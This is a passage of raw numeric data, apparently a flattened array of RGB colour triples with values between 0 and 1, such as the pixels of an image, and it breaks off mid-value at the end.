{0.843,0.659,0.553},{0.831,0.643,0.537},{0.808,0.608,0.478},{0.788,0.573,0.435},{0.765,0.545,0.404},{0.757,0.525,0.373},{0.725,0.498,0.349},{0.694,0.455,0.31},{0.663,0.443,0.278},{0.639,0.42,0.235},{0.608,0.349,0.184},{0.576,0.322,0.157},{0.553,0.298,0.141},{0.529,0.263,0.11},{0.518,0.255,0.094},{0.537,0.275,0.102},{0.553,0.302,0.114},{0.576,0.345,0.149},{0.62,0.412,0.212},{0.643,0.443,0.251},{0.647,0.459,0.271},{0.659,0.471,0.282},{0.675,0.49,0.322},{0.675,0.49,0.325},{0.686,0.518,0.349},{0.702,0.533,0.365},{0.698,0.545,0.376},{0.71,0.549,0.384},{0.729,0.557,0.392},{0.733,0.561,0.396},{0.741,0.569,0.404},{0.749,0.58,0.416},{0.753,0.584,0.42},{0.749,0.58,0.416},{0.753,0.573,0.412},{0.757,0.569,0.412},{0.753,0.565,0.4},{0.757,0.573,0.404},{0.745,0.557,0.384},{0.741,0.549,0.38},{0.745,0.545,0.376},{0.741,0.541,0.357},{0.745,0.541,0.353},{0.906,0.953,1},{0.906,0.953,1},{0.922,0.957,0.98},{0.796,0.761,0.776},{0.671,0.584,0.62},{0.624,0.545,0.58},{0.6,0.494,0.478},{0.545,0.404,0.333},{0.467,0.318,0.227},{0.412,0.227,0.122},
{0.384,0.204,0.11},{0.376,0.184,0.106},{0.38,0.22,0.11},{0.341,0.204,0.094},{0.31,0.169,0.082},{0.251,0.118,0.047},{0.2,0.098,0.039},{0.247,0.125,0.063},{0.353,0.208,0.11},{0.427,0.255,0.141},{0.49,0.275,0.149},{0.592,0.353,0.188},{0.643,0.369,0.2},{0.643,0.357,0.192},{0.608,0.318,0.141},{0.514,0.259,0.082},{0.435,0.216,0.055},{0.337,0.153,0.047},{0.322,0.165,0.059},{0.424,0.231,0.055},{0.451,0.271,0.082},{0.467,0.302,0.122},{0.522,0.357,0.176},{0.545,0.376,0.192},{0.537,0.361,0.165},{0.49,0.306,0.118},{0.396,0.204,0.043},{0.314,0.129,0.012},{0.318,0.149,0.031},{0.647,0.471,0.31},{0.737,0.651,0.557},{0.725,0.698,0.624},{0.859,0.749,0.686},{0.902,0.78,0.718},{0.918,0.8,0.753},{0.925,0.8,0.745},{0.937,0.808,0.737},{0.937,0.804,0.725},{0.929,0.804,0.729},{0.922,0.812,0.725},{0.925,0.812,0.718},{0.925,0.808,0.71},{0.925,0.792,0.698},{0.918,0.769,0.671},{0.902,0.741,0.651},{0.878,0.706,0.612},{0.875,0.69,0.596},{0.851,0.667,0.557},{0.831,0.643,0.537},{0.804,0.6,0.471},{0.8,0.584,0.447},{0.773,0.553,0.412},{0.753,0.525,0.373},
{0.725,0.498,0.349},{0.69,0.451,0.306},{0.663,0.427,0.267},{0.627,0.392,0.216},{0.604,0.349,0.184},{0.569,0.314,0.145},{0.545,0.286,0.133},{0.525,0.259,0.106},{0.522,0.267,0.106},{0.533,0.286,0.106},{0.557,0.325,0.129},{0.596,0.38,0.18},{0.635,0.424,0.224},{0.651,0.447,0.259},{0.659,0.467,0.29},{0.659,0.471,0.294},{0.663,0.478,0.314},{0.686,0.502,0.333},{0.686,0.529,0.353},{0.694,0.541,0.365},{0.694,0.549,0.376},{0.71,0.549,0.384},{0.725,0.553,0.396},{0.729,0.557,0.404},{0.737,0.569,0.408},{0.745,0.576,0.412},{0.749,0.58,0.416},{0.749,0.58,0.416},{0.749,0.569,0.408},{0.765,0.576,0.42},{0.761,0.576,0.416},{0.749,0.561,0.404},{0.749,0.557,0.392},{0.753,0.561,0.392},{0.753,0.553,0.384},{0.749,0.549,0.369},{0.757,0.557,0.365},{0.914,0.949,0.992},{0.914,0.949,0.992},{0.733,0.592,0.588},{0.376,0.133,0.114},{0.353,0.161,0.118},{0.384,0.216,0.165},{0.349,0.216,0.133},{0.302,0.184,0.102},{0.29,0.169,0.082},{0.286,0.157,0.086},{0.361,0.224,0.129},{0.431,0.302,0.165},{0.373,0.235,0.086},{0.306,0.161,0.059},{0.286,0.145,0.063},{0.373,0.239,0.173},
{0.561,0.42,0.341},{0.682,0.498,0.392},{0.659,0.42,0.278},{0.631,0.369,0.212},{0.643,0.345,0.18},{0.678,0.38,0.204},{0.702,0.42,0.239},{0.702,0.416,0.227},{0.678,0.369,0.176},{0.647,0.337,0.137},{0.631,0.325,0.118},{0.545,0.306,0.118},{0.376,0.192,0.055},{0.18,0.067,0.012},{0.329,0.184,0.067},{0.424,0.235,0.071},{0.357,0.184,0.051},{0.282,0.122,0.016},{0.31,0.157,0.031},{0.365,0.188,0.051},{0.357,0.173,0.043},{0.357,0.169,0.039},{0.522,0.322,0.157},{0.596,0.357,0.176},{0.694,0.459,0.318},{0.804,0.659,0.565},{0.808,0.714,0.651},{0.875,0.769,0.69},{0.918,0.792,0.71},{0.945,0.808,0.741},{0.945,0.812,0.749},{0.937,0.804,0.733},{0.945,0.816,0.737},{0.925,0.816,0.729},{0.925,0.812,0.718},{0.929,0.804,0.706},{0.929,0.792,0.698},{0.914,0.773,0.675},{0.906,0.753,0.655},{0.894,0.729,0.631},{0.867,0.686,0.588},{0.855,0.663,0.561},{0.831,0.643,0.518},{0.812,0.608,0.467},{0.792,0.573,0.435},{0.765,0.549,0.404},{0.749,0.533,0.373},{0.725,0.494,0.341},{0.694,0.447,0.302},{0.667,0.424,0.263},{0.631,0.376,0.216},{0.592,0.337,0.157},{0.553,0.298,0.129},
{0.541,0.278,0.122},{0.506,0.251,0.09},{0.518,0.267,0.106},{0.525,0.294,0.11},{0.569,0.361,0.161},{0.604,0.4,0.208},{0.631,0.431,0.239},{0.631,0.435,0.243},{0.647,0.463,0.294},{0.663,0.475,0.31},{0.663,0.478,0.306},{0.69,0.518,0.337},{0.686,0.541,0.365},{0.698,0.549,0.376},{0.698,0.549,0.38},{0.714,0.553,0.384},{0.725,0.557,0.396},{0.725,0.557,0.396},{0.741,0.569,0.404},{0.745,0.569,0.408},{0.741,0.573,0.408},{0.753,0.588,0.424},{0.753,0.569,0.412},{0.761,0.573,0.416},{0.761,0.569,0.412},{0.749,0.561,0.4},{0.741,0.549,0.384},{0.745,0.553,0.384},{0.745,0.553,0.38},{0.745,0.553,0.373},{0.757,0.553,0.376},{0.859,0.855,0.871},{0.859,0.855,0.871},{0.502,0.22,0.227},{0.38,0.231,0.22},{0.31,0.153,0.11},{0.263,0.118,0.067},{0.239,0.11,0.059},{0.263,0.122,0.051},{0.333,0.176,0.09},{0.42,0.267,0.145},{0.482,0.318,0.188},{0.443,0.271,0.161},{0.439,0.278,0.192},{0.506,0.349,0.255},{0.675,0.529,0.451},{0.769,0.608,0.533},{0.722,0.533,0.424},{0.667,0.431,0.29},{0.639,0.38,0.224},{0.631,0.361,0.196},{0.616,0.329,0.153},{0.596,0.306,0.129},
{0.651,0.373,0.196},{0.714,0.435,0.239},{0.702,0.404,0.204},{0.675,0.361,0.165},{0.647,0.337,0.137},{0.635,0.333,0.129},{0.6,0.329,0.118},{0.467,0.239,0.059},{0.227,0.086,0.016},{0.231,0.086,0.027},{0.278,0.125,0.039},{0.275,0.125,0.047},{0.224,0.075,0.02},{0.318,0.129,0.039},{0.447,0.224,0.082},{0.565,0.333,0.161},{0.592,0.365,0.204},{0.576,0.365,0.224},{0.643,0.431,0.286},{0.8,0.592,0.471},{0.812,0.635,0.545},{0.867,0.722,0.631},{0.91,0.78,0.686},{0.929,0.796,0.722},{0.933,0.804,0.745},{0.941,0.808,0.737},{0.933,0.808,0.725},{0.945,0.816,0.737},{0.933,0.808,0.722},{0.929,0.804,0.706},{0.925,0.788,0.69},{0.914,0.776,0.671},{0.894,0.745,0.647},{0.89,0.725,0.627},{0.875,0.69,0.596},{0.863,0.667,0.569},{0.835,0.643,0.514},{0.812,0.6,0.459},{0.784,0.561,0.424},{0.757,0.529,0.392},{0.737,0.514,0.361},{0.714,0.482,0.325},{0.678,0.435,0.282},{0.659,0.416,0.255},{0.627,0.365,0.212},{0.576,0.325,0.149},{0.545,0.286,0.129},{0.518,0.259,0.11},{0.49,0.247,0.094},{0.51,0.271,0.102},{0.545,0.329,0.137},{0.573,0.369,0.176},{0.604,0.396,0.22},
{0.62,0.42,0.239},{0.635,0.435,0.255},{0.647,0.463,0.29},{0.659,0.475,0.31},{0.675,0.49,0.325},{0.69,0.525,0.353},{0.678,0.525,0.353},{0.702,0.545,0.376},{0.702,0.553,0.38},{0.718,0.561,0.392},{0.725,0.557,0.392},{0.737,0.569,0.404},{0.749,0.573,0.412},{0.749,0.573,0.412},{0.737,0.561,0.4},{0.741,0.561,0.4},{0.753,0.569,0.412},{0.757,0.569,0.412},{0.753,0.561,0.404},{0.749,0.557,0.4},{0.749,0.557,0.392},{0.745,0.553,0.384},{0.741,0.553,0.376},{0.741,0.553,0.373},{0.757,0.557,0.38},{0.686,0.486,0.459},{0.686,0.486,0.459},{0.435,0.243,0.239},{0.333,0.196,0.176},{0.29,0.145,0.11},{0.235,0.106,0.067},{0.247,0.114,0.047},{0.392,0.224,0.122},{0.51,0.337,0.192},{0.584,0.42,0.302},{0.639,0.475,0.373},{0.576,0.404,0.314},{0.486,0.314,0.239},{0.6,0.427,0.369},{0.78,0.639,0.565},{0.784,0.596,0.498},{0.686,0.447,0.306},{0.667,0.388,0.227},{0.643,0.365,0.196},{0.651,0.369,0.196},{0.643,0.357,0.176},{0.663,0.384,0.204},{0.671,0.404,0.224},{0.682,0.412,0.22},{0.69,0.396,0.2},{0.675,0.369,0.173},{0.663,0.349,0.153},{0.659,0.349,0.157},
{0.643,0.369,0.169},{0.608,0.345,0.137},{0.533,0.263,0.067},{0.443,0.188,0.035},{0.459,0.204,0.043},{0.498,0.239,0.075},{0.541,0.275,0.102},{0.549,0.298,0.114},{0.58,0.341,0.153},{0.596,0.361,0.192},{0.6,0.376,0.224},{0.604,0.384,0.239},{0.643,0.416,0.282},{0.784,0.557,0.439},{0.816,0.608,0.502},{0.839,0.655,0.549},{0.898,0.765,0.667},{0.925,0.792,0.71},{0.929,0.8,0.733},{0.937,0.804,0.733},{0.937,0.808,0.725},{0.957,0.82,0.737},{0.937,0.808,0.718},{0.929,0.804,0.706},{0.918,0.78,0.686},{0.91,0.773,0.671},{0.89,0.741,0.639},{0.882,0.722,0.616},{0.871,0.694,0.584},{0.859,0.667,0.561},{0.839,0.647,0.518},{0.82,0.616,0.471},{0.776,0.553,0.416},{0.749,0.518,0.376},{0.733,0.502,0.349},{0.694,0.459,0.306},{0.667,0.416,0.263},{0.635,0.392,0.227},{0.6,0.341,0.192},{0.553,0.298,0.141},{0.506,0.251,0.106},{0.482,0.247,0.102},{0.463,0.239,0.082},{0.494,0.278,0.102},{0.525,0.322,0.125},{0.573,0.369,0.188},{0.608,0.404,0.231},{0.616,0.416,0.239},{0.62,0.424,0.251},{0.643,0.459,0.29},{0.659,0.482,0.314},{0.675,0.498,0.333},{0.682,0.514,0.349},
{0.678,0.51,0.345},{0.694,0.525,0.361},{0.69,0.541,0.369},{0.714,0.557,0.388},{0.725,0.557,0.392},{0.741,0.573,0.408},{0.753,0.58,0.42},{0.741,0.565,0.404},{0.749,0.565,0.404},{0.749,0.561,0.404},{0.753,0.565,0.404},{0.749,0.561,0.404},{0.753,0.565,0.408},{0.757,0.569,0.408},{0.745,0.553,0.388},{0.745,0.553,0.384},{0.741,0.553,0.376},{0.753,0.565,0.388},{0.753,0.549,0.376},{0.529,0.18,0.176},{0.529,0.18,0.176},{0.416,0.275,0.263},{0.298,0.161,0.137},{0.239,0.114,0.09},{0.286,0.129,0.075},{0.424,0.235,0.129},{0.569,0.388,0.271},{0.678,0.533,0.431},{0.663,0.514,0.412},{0.522,0.357,0.259},{0.392,0.267,0.196},{0.271,0.184,0.145},{0.561,0.431,0.38},{0.824,0.682,0.596},{0.761,0.541,0.396},{0.69,0.42,0.247},{0.675,0.384,0.216},{0.667,0.365,0.196},{0.651,0.349,0.176},{0.667,0.373,0.2},{0.702,0.427,0.247},{0.71,0.447,0.271},{0.702,0.431,0.247},{0.69,0.396,0.208},{0.675,0.376,0.184},{0.663,0.353,0.165},{0.651,0.349,0.157},{0.643,0.365,0.173},{0.635,0.361,0.157},{0.596,0.318,0.106},{0.549,0.267,0.078},{0.549,0.278,0.094},{0.561,0.298,0.114},
{0.573,0.31,0.125},{0.588,0.325,0.133},{0.6,0.341,0.153},{0.612,0.361,0.188},{0.612,0.369,0.204},{0.604,0.373,0.216},{0.631,0.392,0.247},{0.792,0.549,0.424},{0.816,0.592,0.482},{0.824,0.612,0.494},{0.863,0.706,0.604},{0.918,0.776,0.678},{0.925,0.792,0.706},{0.937,0.804,0.722},{0.945,0.808,0.725},{0.945,0.812,0.722},{0.941,0.808,0.714},{0.941,0.808,0.71},{0.929,0.796,0.698},{0.906,0.773,0.667},{0.89,0.741,0.639},{0.871,0.714,0.596},{0.867,0.686,0.565},{0.835,0.647,0.525},{0.824,0.635,0.502},{0.8,0.592,0.451},{0.773,0.557,0.416},{0.741,0.525,0.373},{0.702,0.482,0.329},{0.682,0.443,0.29},{0.651,0.4,0.251},{0.608,0.369,0.212},{0.561,0.314,0.169},{0.518,0.278,0.114},{0.463,0.235,0.086},{0.42,0.212,0.063},{0.435,0.227,0.067},{0.467,0.267,0.09},{0.522,0.325,0.133},{0.545,0.349,0.153},{0.573,0.376,0.184},{0.584,0.388,0.2},{0.592,0.408,0.231},{0.604,0.424,0.251},{0.635,0.467,0.29},{0.643,0.475,0.306},{0.659,0.49,0.325},{0.659,0.49,0.325},{0.682,0.514,0.349},{0.678,0.522,0.353},{0.694,0.537,0.369},{0.722,0.553,0.388},{0.733,0.565,0.4},
{0.741,0.565,0.404},{0.745,0.569,0.408},{0.753,0.573,0.408},{0.753,0.569,0.404},{0.745,0.557,0.4},{0.753,0.565,0.408},{0.761,0.576,0.412},{0.757,0.573,0.408},{0.741,0.553,0.384},{0.749,0.557,0.388},{0.753,0.561,0.392},{0.749,0.557,0.388},{0.753,0.549,0.38},{0.498,0.196,0.212},{0.498,0.196,0.212},{0.4,0.267,0.239},{0.278,0.141,0.129},{0.255,0.133,0.098},{0.384,0.216,0.122},{0.58,0.392,0.286},{0.722,0.565,0.475},{0.671,0.525,0.431},{0.596,0.439,0.361},{0.522,0.416,0.373},{0.259,0.22,0.184},{0.157,0.114,0.114},{0.514,0.384,0.345},{0.831,0.663,0.569},{0.769,0.518,0.361},{0.729,0.439,0.255},{0.698,0.4,0.22},{0.678,0.361,0.192},{0.678,0.357,0.188},{0.686,0.384,0.212},{0.757,0.478,0.298},{0.792,0.525,0.353},{0.757,0.486,0.302},{0.714,0.42,0.231},{0.69,0.392,0.2},{0.675,0.376,0.184},{0.655,0.365,0.169},{0.635,0.357,0.165},{0.631,0.341,0.145},{0.616,0.314,0.118},{0.576,0.271,0.075},{0.557,0.267,0.075},{0.549,0.271,0.094},{0.569,0.294,0.11},{0.592,0.318,0.118},{0.604,0.322,0.129},{0.62,0.333,0.161},{0.627,0.345,0.176},{0.62,0.345,0.176},
{0.635,0.369,0.212},{0.776,0.525,0.392},{0.816,0.584,0.467},{0.831,0.592,0.475},{0.835,0.647,0.541},{0.89,0.737,0.631},{0.925,0.78,0.69},{0.929,0.784,0.706},{0.933,0.788,0.706},{0.941,0.808,0.714},{0.933,0.8,0.702},{0.929,0.796,0.698},{0.91,0.784,0.678},{0.898,0.765,0.647},{0.875,0.729,0.616},{0.859,0.698,0.58},{0.843,0.667,0.537},{0.831,0.643,0.51},{0.8,0.612,0.467},{0.8,0.584,0.443},{0.78,0.549,0.412},{0.729,0.514,0.361},{0.694,0.478,0.322},{0.659,0.435,0.275},{0.627,0.384,0.231},{0.573,0.333,0.188},{0.502,0.275,0.137},{0.435,0.22,0.082},{0.373,0.173,0.043},{0.392,0.196,0.055},{0.424,0.227,0.075},{0.451,0.251,0.086},{0.475,0.278,0.098},{0.498,0.302,0.11},{0.525,0.329,0.141},{0.537,0.341,0.149},{0.553,0.369,0.192},{0.58,0.384,0.216},{0.592,0.412,0.239},{0.608,0.439,0.275},{0.627,0.459,0.294},{0.631,0.463,0.298},{0.651,0.482,0.318},{0.655,0.482,0.322},{0.675,0.502,0.337},{0.694,0.525,0.361},{0.718,0.549,0.384},{0.741,0.565,0.404},{0.749,0.573,0.412},{0.757,0.576,0.412},{0.753,0.569,0.404},{0.741,0.553,0.396},{0.749,0.561,0.404},
{0.749,0.565,0.404},{0.745,0.561,0.396},{0.745,0.557,0.388},{0.757,0.565,0.396},{0.757,0.565,0.396},{0.753,0.561,0.392},{0.761,0.557,0.384},{0.443,0.243,0.267},{0.443,0.243,0.267},{0.412,0.278,0.247},{0.278,0.149,0.125},{0.341,0.188,0.145},{0.588,0.412,0.333},{0.718,0.569,0.478},{0.678,0.518,0.408},{0.627,0.455,0.353},{0.639,0.498,0.447},{0.51,0.412,0.369},{0.125,0.106,0.094},{0.165,0.106,0.086},{0.525,0.365,0.322},{0.835,0.647,0.525},{0.773,0.525,0.337},{0.749,0.451,0.259},{0.71,0.412,0.224},{0.714,0.404,0.22},{0.682,0.373,0.176},{0.592,0.278,0.11},{0.608,0.318,0.173},{0.737,0.455,0.286},{0.776,0.506,0.314},{0.733,0.463,0.267},{0.686,0.416,0.224},{0.667,0.4,0.204},{0.659,0.384,0.18},{0.655,0.376,0.18},{0.635,0.341,0.145},{0.608,0.302,0.102},{0.58,0.263,0.067},{0.545,0.227,0.039},{0.541,0.239,0.059},{0.549,0.255,0.082},{0.588,0.282,0.102},{0.616,0.306,0.118},{0.635,0.325,0.129},{0.647,0.345,0.145},{0.639,0.341,0.149},{0.659,0.357,0.184},{0.773,0.502,0.353},{0.812,0.573,0.443},{0.824,0.584,0.455},{0.843,0.624,0.506},{0.855,0.675,0.569},
{0.902,0.753,0.659},{0.933,0.769,0.675},{0.929,0.784,0.694},{0.933,0.792,0.698},{0.925,0.788,0.69},{0.918,0.776,0.671},{0.906,0.761,0.655},{0.886,0.745,0.631},{0.859,0.714,0.6},{0.843,0.686,0.569},{0.835,0.647,0.525},{0.82,0.624,0.49},{0.788,0.588,0.443},{0.769,0.549,0.404},{0.729,0.51,0.365},{0.69,0.475,0.322},{0.659,0.443,0.286},{0.631,0.408,0.247},{0.58,0.357,0.192},{0.49,0.282,0.125},{0.408,0.204,0.082},{0.318,0.133,0.031},{0.298,0.137,0.035},{0.333,0.157,0.039},{0.373,0.192,0.039},{0.404,0.224,0.063},{0.435,0.243,0.075},{0.455,0.267,0.094},{0.478,0.286,0.114},{0.49,0.298,0.125},{0.502,0.31,0.137},{0.522,0.329,0.169},{0.549,0.357,0.196},{0.58,0.388,0.227},{0.604,0.412,0.251},{0.608,0.42,0.259},{0.627,0.443,0.278},{0.627,0.439,0.278},{0.659,0.467,0.306},{0.682,0.494,0.333},{0.702,0.525,0.365},{0.725,0.553,0.388},{0.737,0.569,0.404},{0.749,0.573,0.412},{0.745,0.569,0.408},{0.757,0.569,0.408},{0.757,0.565,0.404},{0.761,0.573,0.404},{0.757,0.569,0.4},{0.761,0.576,0.404},{0.745,0.565,0.392},{0.761,0.557,0.384},{0.749,0.565,0.384},
{0.757,0.561,0.384},{0.38,0.255,0.314},{0.38,0.255,0.314},{0.384,0.267,0.247},{0.329,0.188,0.153},{0.573,0.42,0.357},{0.753,0.604,0.533},{0.714,0.58,0.467},{0.62,0.408,0.286},{0.667,0.51,0.4},{0.624,0.471,0.388},{0.545,0.431,0.353},{0.106,0.075,0.063},{0.165,0.102,0.09},{0.553,0.361,0.302},{0.843,0.635,0.498},{0.78,0.506,0.318},{0.71,0.408,0.216},{0.694,0.392,0.204},{0.698,0.408,0.224},{0.631,0.341,0.176},{0.573,0.286,0.165},{0.318,0.094,0.047},{0.529,0.267,0.169},{0.694,0.443,0.271},{0.737,0.49,0.322},{0.722,0.475,0.298},{0.678,0.427,0.255},{0.671,0.412,0.227},{0.671,0.396,0.204},{0.647,0.349,0.153},{0.612,0.294,0.098},{0.584,0.255,0.059},{0.533,0.216,0.024},{0.518,0.22,0.035},{0.529,0.231,0.067},{0.557,0.247,0.082},{0.596,0.278,0.098},{0.643,0.322,0.125},{0.667,0.357,0.149},{0.678,0.369,0.169},{0.682,0.369,0.184},{0.749,0.467,0.314},{0.804,0.557,0.424},{0.831,0.596,0.463},{0.843,0.62,0.494},{0.847,0.651,0.533},{0.863,0.749,0.655},{0.902,0.749,0.651},{0.918,0.769,0.667},{0.922,0.773,0.671},{0.914,0.773,0.663},{0.902,0.761,0.643},
{0.89,0.733,0.624},{0.882,0.725,0.624},{0.835,0.682,0.573},{0.827,0.663,0.537},{0.796,0.604,0.475},{0.784,0.588,0.447},{0.765,0.565,0.412},{0.733,0.514,0.369},{0.686,0.467,0.318},{0.647,0.431,0.278},{0.616,0.404,0.247},{0.576,0.349,0.188},{0.482,0.278,0.133},{0.349,0.188,0.059},{0.22,0.082,0.024},{0.196,0.075,0.016},{0.231,0.102,0.027},{0.306,0.133,0.031},{0.345,0.165,0.027},{0.357,0.176,0.039},{0.388,0.2,0.051},{0.408,0.216,0.055},{0.427,0.235,0.075},{0.447,0.251,0.09},{0.463,0.271,0.11},{0.482,0.29,0.129},{0.514,0.322,0.161},{0.537,0.345,0.184},{0.561,0.369,0.208},{0.58,0.396,0.231},{0.604,0.42,0.255},{0.616,0.424,0.263},{0.639,0.447,0.286},{0.667,0.475,0.318},{0.698,0.522,0.361},{0.725,0.557,0.392},{0.753,0.584,0.42},{0.745,0.573,0.412},{0.757,0.58,0.42},{0.757,0.584,0.424},{0.749,0.576,0.412},{0.757,0.576,0.408},{0.761,0.58,0.412},{0.769,0.588,0.424},{0.765,0.573,0.4},{0.769,0.565,0.404},{0.757,0.569,0.396},{0.757,0.549,0.373},{0.322,0.224,0.278},{0.322,0.224,0.278},{0.294,0.176,0.161},{0.51,0.353,0.31},{0.769,0.627,0.553},
{0.839,0.718,0.651},{0.569,0.408,0.278},{0.584,0.353,0.216},{0.706,0.498,0.384},{0.69,0.502,0.404},{0.588,0.455,0.361},{0.122,0.086,0.078},{0.196,0.106,0.094},{0.604,0.412,0.325},{0.812,0.596,0.443},{0.733,0.431,0.239},{0.647,0.337,0.153},{0.682,0.388,0.196},{0.678,0.412,0.227},{0.655,0.376,0.235},{0.478,0.188,0.086},{0.298,0.082,0.047},{0.486,0.255,0.216},{0.675,0.467,0.329},{0.686,0.455,0.294},{0.733,0.49,0.333},{0.741,0.502,0.345},{0.71,0.459,0.29},{0.671,0.396,0.22},{0.655,0.357,0.165},{0.6,0.278,0.082},{0.584,0.247,0.055},{0.529,0.2,0.02},{0.494,0.192,0.02},{0.518,0.212,0.059},{0.545,0.227,0.078},{0.576,0.251,0.086},{0.643,0.318,0.129},{0.682,0.357,0.149},{0.714,0.392,0.184},{0.706,0.388,0.192},{0.722,0.427,0.255},{0.792,0.541,0.408},{0.82,0.576,0.443},{0.843,0.62,0.494},{0.867,0.651,0.537},{0.863,0.694,0.576},{0.859,0.725,0.616},{0.871,0.725,0.624},{0.898,0.733,0.624},{0.878,0.737,0.627},{0.863,0.725,0.596},{0.859,0.698,0.576},{0.843,0.678,0.576},{0.824,0.655,0.545},{0.796,0.627,0.498},{0.784,0.592,0.463},{0.753,0.569,0.416},
{0.722,0.525,0.365},{0.675,0.451,0.302},{0.639,0.412,0.263},{0.608,0.384,0.227},{0.545,0.329,0.176},{0.439,0.247,0.122},{0.267,0.129,0.067},{0.118,0.043,0.02},{0.129,0.067,0.039},{0.18,0.102,0.063},{0.365,0.278,0.22},{0.388,0.275,0.208},{0.365,0.231,0.145},{0.314,0.145,0.027},{0.349,0.145,0.027},{0.376,0.176,0.027},{0.396,0.204,0.047},{0.404,0.212,0.063},{0.427,0.235,0.086},{0.451,0.255,0.086},{0.494,0.298,0.125},{0.518,0.325,0.165},{0.545,0.349,0.188},{0.569,0.38,0.224},{0.596,0.412,0.255},{0.616,0.427,0.267},{0.631,0.451,0.29},{0.671,0.482,0.329},{0.694,0.522,0.369},{0.725,0.561,0.404},{0.733,0.573,0.408},{0.737,0.58,0.427},{0.757,0.596,0.459},{0.745,0.596,0.459},{0.753,0.612,0.471},{0.729,0.592,0.455},{0.769,0.624,0.506},{0.78,0.671,0.549},{0.757,0.627,0.506},{0.753,0.643,0.525},{0.761,0.651,0.514},{0.749,0.624,0.51},{0.259,0.173,0.2},{0.259,0.173,0.2},{0.302,0.18,0.165},{0.757,0.616,0.557},{0.831,0.714,0.639},{0.878,0.761,0.675},{0.525,0.337,0.192},{0.522,0.282,0.153},{0.655,0.431,0.306},{0.757,0.545,0.435},{0.639,0.471,0.376},
{0.196,0.133,0.118},{0.318,0.196,0.149},{0.706,0.514,0.408},{0.773,0.522,0.345},{0.655,0.353,0.165},{0.62,0.325,0.153},{0.647,0.38,0.2},{0.706,0.471,0.31},{0.6,0.278,0.173},{0.494,0.169,0.098},{0.565,0.314,0.22},{0.612,0.357,0.294},{0.682,0.443,0.329},{0.678,0.431,0.271},{0.702,0.439,0.29},{0.776,0.545,0.392},{0.776,0.525,0.369},{0.702,0.424,0.259},{0.663,0.353,0.165},{0.612,0.271,0.078},{0.584,0.235,0.047},{0.537,0.2,0.024},{0.498,0.184,0.027},{0.51,0.192,0.051},{0.529,0.208,0.059},{0.565,0.239,0.078},{0.631,0.302,0.118},{0.686,0.357,0.149},{0.725,0.396,0.184},{0.725,0.396,0.2},{0.71,0.4,0.216},{0.784,0.522,0.384},{0.82,0.569,0.435},{0.835,0.596,0.467},{0.855,0.655,0.533},{0.89,0.686,0.557},{0.859,0.706,0.592},{0.808,0.71,0.627},{0.8,0.663,0.573},{0.835,0.671,0.565},{0.827,0.663,0.557},{0.824,0.639,0.525},{0.808,0.627,0.494},{0.788,0.596,0.451},{0.757,0.561,0.404},{0.737,0.533,0.38},{0.706,0.49,0.329},{0.667,0.443,0.278},{0.6,0.38,0.227},{0.537,0.318,0.176},{0.451,0.259,0.122},{0.306,0.157,0.075},{0.18,0.09,0.059},
{0.153,0.106,0.086},{0.251,0.212,0.169},{0.325,0.263,0.204},{0.506,0.439,0.345},{0.424,0.373,0.271},{0.376,0.302,0.216},{0.49,0.431,0.357},{0.404,0.318,0.231},{0.424,0.286,0.204},{0.349,0.157,0.043},{0.376,0.204,0.078},{0.412,0.243,0.098},{0.435,0.267,0.122},{0.459,0.302,0.169},{0.49,0.365,0.22},{0.529,0.392,0.275},{0.557,0.443,0.322},{0.596,0.486,0.369},{0.635,0.529,0.412},{0.624,0.518,0.412},{0.651,0.553,0.451},{0.655,0.584,0.467},{0.663,0.584,0.467},{0.659,0.588,0.478},{0.745,0.667,0.576},{0.71,0.631,0.537},{0.706,0.624,0.537},{0.714,0.639,0.533},{0.706,0.647,0.522},{0.753,0.69,0.6},{0.737,0.667,0.58},{0.706,0.62,0.537},{0.745,0.698,0.608},{0.749,0.671,0.608},{0.698,0.612,0.506},{0.722,0.616,0.506},{0.204,0.125,0.118},{0.204,0.125,0.118},{0.471,0.341,0.333},{0.831,0.714,0.647},{0.867,0.765,0.69},{0.89,0.765,0.651},{0.584,0.369,0.2},{0.451,0.208,0.106},{0.565,0.329,0.216},{0.675,0.455,0.329},{0.62,0.396,0.275},{0.322,0.153,0.094},{0.447,0.278,0.196},{0.761,0.561,0.451},{0.686,0.475,0.322},{0.588,0.31,0.145},{0.529,0.251,0.118},
{0.639,0.408,0.286},{0.682,0.431,0.318},{0.545,0.188,0.125},{0.502,0.184,0.137},{0.655,0.435,0.329},{0.678,0.427,0.369},{0.655,0.345,0.251},{0.682,0.4,0.243},{0.706,0.408,0.255},{0.784,0.541,0.392},{0.792,0.541,0.396},{0.757,0.471,0.314},{0.671,0.353,0.165},{0.616,0.263,0.071},{0.58,0.22,0.035},{0.537,0.192,0.016},{0.498,0.169,0.016},{0.502,0.18,0.039},{0.522,0.2,0.047},{0.569,0.239,0.082},{0.624,0.298,0.114},{0.678,0.349,0.141},{0.718,0.384,0.18},{0.733,0.396,0.204},{0.722,0.404,0.208},{0.769,0.51,0.345},{0.812,0.561,0.42},{0.831,0.584,0.439},{0.863,0.655,0.533},{0.871,0.69,0.58},{0.863,0.69,0.588},{0.839,0.71,0.624},{0.769,0.667,0.616},{0.675,0.553,0.475},{0.659,0.506,0.404},{0.675,0.49,0.384},{0.675,0.478,0.357},{0.667,0.451,0.318},{0.631,0.412,0.275},{0.584,0.365,0.231},{0.525,0.31,0.18},{0.447,0.251,0.133},{0.353,0.184,0.078},{0.349,0.208,0.125},{0.251,0.157,0.125},{0.357,0.29,0.251},{0.337,0.278,0.227},{0.384,0.322,0.275},{0.447,0.384,0.329},{0.451,0.388,0.322},{0.431,0.369,0.302},{0.525,0.482,0.408},{0.529,0.49,0.431},
{0.533,0.49,0.427},{0.525,0.486,0.416},{0.514,0.463,0.384},{0.459,0.373,0.275},{0.525,0.455,0.353},{0.545,0.471,0.365},{0.541,0.471,0.365},{0.557,0.478,0.376},{0.569,0.502,0.396},{0.584,0.502,0.388},{0.604,0.498,0.4},{0.675,0.565,0.447},{0.682,0.576,0.459},{0.71,0.592,0.486},{0.725,0.62,0.51},{0.725,0.612,0.502},{0.741,0.627,0.514},{0.757,0.651,0.529},{0.722,0.596,0.467},{0.725,0.588,0.447},{0.757,0.624,0.482},{0.769,0.631,0.498},{0.792,0.671,0.537},{0.753,0.635,0.486},{0.761,0.631,0.51},{0.788,0.667,0.51},{0.761,0.612,0.455},{0.765,0.608,0.463},{0.773,0.596,0.459},{0.776,0.62,0.478},{0.251,0.129,0.114},{0.251,0.129,0.114},{0.667,0.549,0.506},{0.851,0.749,0.682},{0.878,0.776,0.722},{0.886,0.753,0.627},{0.69,0.471,0.286},{0.502,0.251,0.118},{0.522,0.306,0.176},{0.545,0.